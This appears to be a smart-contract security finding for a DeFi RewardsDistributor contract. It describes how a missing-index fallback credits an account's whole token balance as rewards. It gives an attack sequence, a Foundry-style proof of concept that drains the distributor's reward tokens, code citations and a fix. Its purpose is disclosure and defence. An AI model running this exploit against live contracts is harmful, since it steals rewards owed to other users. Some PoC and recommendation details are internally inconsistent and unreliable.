### Title
Missing-index fallback in `RewardsDistributor._calculateTokenDelta` credits an attacker's entire token balance as rewards when the global index equals `INITIAL_INDEX` - ([File: contracts/RewardsDistributor.sol](contracts/RewardsDistributor.sol))

### Summary
`_calculateTokenDelta` treats `accountIndexOf[token_][account_] == 0` as "never synced" and falls back to `INITIAL_INDEX` only when the global index is strictly greater than `INITIAL_INDEX` [1](#0-0) . When a reward token is freshly registered, `tokenStates[token_].index` is set exactly to `INITIAL_INDEX` [2](#0-1) . Any account whose stored index is still `0` then gets `_deltaIndex = INITIAL_INDEX - 0 = 1e18`, producing `_tokensDelta = balance.wadMul(1e18) = balance` — the account is credited rewards equal to its full deposit/debt token balance [3](#0-2) . Analogous to prototype pollution: a missing per-account key silently inherits a default that yields attacker-controlled state.

### Finding Description
Two public, unprivileged entry points reach the bug:

- `updateBeforeMintOrBurn(token_, account_)` is callable by anyone ("This function also may be called by anyone to update stored indexes") [4](#0-3) .
- `claimRewards(accounts_, tokens_)` is unauthenticated and settles `tokensAccruedOf` by transferring `rewardToken` [5](#0-4) , with `_transferRewardIfEnoughTokens` paying out as long as the distributor holds enough `rewardToken` [6](#0-5) .

Attack sequence:

1. Attacker deposits underlying into the Pool and holds `DepositToken` (or mints `DebtToken`) so `balanceOf(attacker) > 0`, while `accountIndexOf[token][attacker] == 0`.
2. Governor calls `updateTokenSpeed(token, speed > 0)` (or `syncTokenSpeed`), registering the token with `index = INITIAL_INDEX` and `timestamp = block.timestamp` [2](#0-1) .
3. In the same block (same timestamp), attacker calls `updateBeforeMintOrBurn(token, attacker)`. Since `_deltaTimestamps == 0`, `_updateTokenIndex` leaves `index == INITIAL_INDEX` [7](#0-6) . The `index > INITIAL_INDEX` guard fails, so `_accountIndex` stays `0`, `_deltaIndex = 1e18`, and `tokensAccruedOf[attacker] += attackerDepositTokenBalance` [8](#0-7) .
4. Attacker calls `claimRewards(attacker, tokens)` and receives `rewardToken` equal to their deposit-token balance, drained from legitimate accrued rewards of all users.

Alternatively, even without an existing balance, the attacker can back-run the governor's registration transaction in the same block: deposit to receive `DepositToken` — note `updateBeforeMintOrBurn` inside the mint does run, but only when `index > 0`; if the deposit executes *after* the registration tx but *before* index growth, the account index is written as `INITIAL_INDEX` and no delta accrues, so the profitable path is holding the balance *before* registration (step 1), which is trivially achievable.

### Impact Explanation
Direct theft of unclaimed yield: `tokensAccruedOf[attacker]` is inflated to the attacker's entire `DepositToken`/`DebtToken` balance with zero time-weighted accrual, and `claimRewards` transfers real `rewardToken` held by the distributor [6](#0-5) . With a large deposit (which can be flash-funded within the block since the deposit itself is allowed pre-registration), the attacker can drain the distributor's full reward balance, permanently stealing rewards owed to all suppliers/borrowers. The reward-accrual invariant (rewards ∝ balance × elapsed index delta) is broken.

### Likelihood Explanation
The trigger is a governance `updateTokenSpeed` registration tx being observed in the mempool and a same-block `updateBeforeMintOrBurn` call — no privileged role, no oracle manipulation, no malicious infrastructure needed. `updateBeforeMintOrBurn` and `claimRewards` are permissionless by design [9](#0-8) . The only constraint is executing within the same timestamp (same block on L2s with per-block timestamps this is straightforward via builder/back-running). Probability is gated by how often new reward tokens are registered; each registration is one exploitable window.

### Recommendation
Change the fallback so that `accountIndexOf == 0` defaults to the *current* token index (not `INITIAL_INDEX`), i.e. in `_calculateTokenDelta` use `if (_accountIndex == 0) _accountIndex = _tokenIndex == 0 ? INITIAL_INDEX : _tokenIndex;` or simply `if (_accountIndex == 0) _accountIndex = _tokenIndex;` — a never-synced account should accrue zero historical rewards regardless of where the global index sits [1](#0-0) . Alternatively, write `accountIndexOf[token][account] = INITIAL_INDEX` for all holders at registration is impractical, so the fix belongs in the delta calculation.

### Proof of Concept
Hardhat/foundry fork sketch:

```solidity
// fork a chain where RewardsDistributor is live with rewardToken balance R
// attacker already holds D depositToken (deposited in a prior block)

// 1. governor registers token in block B
vm.prank(governor);
rewardsDistributor.updateTokenSpeed(depositToken, 1 ether);

// 2. same block (same timestamp): attacker triggers index update + accrual
vm.prank(attacker);
rewardsDistributor.updateBeforeMintOrBurn(depositToken, attacker);
// accountIndexOf[depositToken][attacker] == 0, token index == INITIAL_INDEX (1e18)
// => _deltaIndex = 1e18, tokensAccruedOf[attacker] = D

// 3. claim
IERC20[] memory toks = new IERC20[](1);
toks[0] = IERC20(address(depositToken));
vm.prank(attacker);
rewardsDistributor.claimRewards(attacker, toks);

assertEq(rewardToken.balanceOf(attacker), D); // stole unclaimed yield
```

The key assertion: `claimable(attacker)` equals `D` (full balance) instead of `D * speed * Δt / totalSupply ≈ 0` for a freshly registered token.

### Citations

**File:** contracts/RewardsDistributor.sol (L150-167)
```text
    function claimRewards(address[] memory accounts_, IERC20[] memory tokens_) public override nonReentrant {
        uint256 _accountsLength = accounts_.length;
        uint256 _tokensLength = tokens_.length;
        for (uint256 i; i < _tokensLength; ++i) {
            IERC20 _token = tokens_[i];

            if (tokenStates[_token].index > 0) {
                _updateTokenIndex(_token);
                for (uint256 j; j < _accountsLength; j++) {
                    _updateTokensAccruedOf(_token, accounts_[j]);
                }
            }
        }

        for (uint256 j; j < _accountsLength; j++) {
            address _account = accounts_[j];
            _transferRewardIfEnoughTokens(_account, tokensAccruedOf[_account]);
        }
```

**File:** contracts/RewardsDistributor.sol (L173-180)
```text
     * This function also may be called by anyone to update stored indexes
     */
    function updateBeforeMintOrBurn(IERC20 token_, address account_) external override {
        if (tokenStates[token_].index > 0) {
            _updateTokenIndex(token_);
            _updateTokensAccruedOf(token_, account_);
        }
    }
```

**File:** contracts/RewardsDistributor.sol (L203-211)
```text
        if (_deltaTimestamps > 0 && _speed > 0) {
            uint256 _totalSupply = token_.totalSupply();
            uint256 _tokensAccrued = _deltaTimestamps * _speed;
            uint256 _ratio = _totalSupply > 0 ? _tokensAccrued.wadDiv(_totalSupply) : 0;
            _newIndex = (_supplyState.index + _ratio).toUint224();
            _newTimestamp = block.timestamp.toUint32();
        } else if (_deltaTimestamps > 0 && _supplyState.index > 0) {
            _newTimestamp = block.timestamp.toUint32();
        }
```

**File:** contracts/RewardsDistributor.sol (L223-230)
```text
        uint256 _accountIndex = accountIndexOf[token_][account_];

        if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
            _accountIndex = INITIAL_INDEX;
        }

        uint256 _deltaIndex = _tokenIndex - _accountIndex;
        _tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

**File:** contracts/RewardsDistributor.sol (L248-255)
```text
    function _transferRewardIfEnoughTokens(address account_, uint256 amount_) private {
        IERC20 _rewardToken = rewardToken;
        uint256 _balance = _rewardToken.balanceOf(address(this));
        if (amount_ > 0 && amount_ <= _balance) {
            tokensAccruedOf[account_] = 0;
            _rewardToken.safeTransfer(account_, amount_);
            emit RewardClaimed(account_, amount_);
        }
```

**File:** contracts/RewardsDistributor.sol (L261-265)
```text
    function _updateTokensAccruedOf(IERC20 token_, address account_) private {
        (uint256 _tokenIndex, uint256 _tokensDelta) = _calculateTokenDelta(tokenStates[token_], token_, account_);
        accountIndexOf[token_][account_] = _tokenIndex;
        tokensAccruedOf[account_] = tokensAccruedOf[account_] + _tokensDelta;
        emit TokensAccruedUpdated(token_, account_, _tokensDelta, _tokenIndex);
```

**File:** contracts/RewardsDistributor.sol (L296-299)
```text
            if (tokenStates[token_].index == 0) {
                if (tokens.length == MAX_REWARD_TOKENS) revert ReachedMaxRewardTokens();
                tokenStates[token_] = TokenState({index: INITIAL_INDEX, timestamp: block.timestamp.toUint32()});
                tokens.push(token_);
```
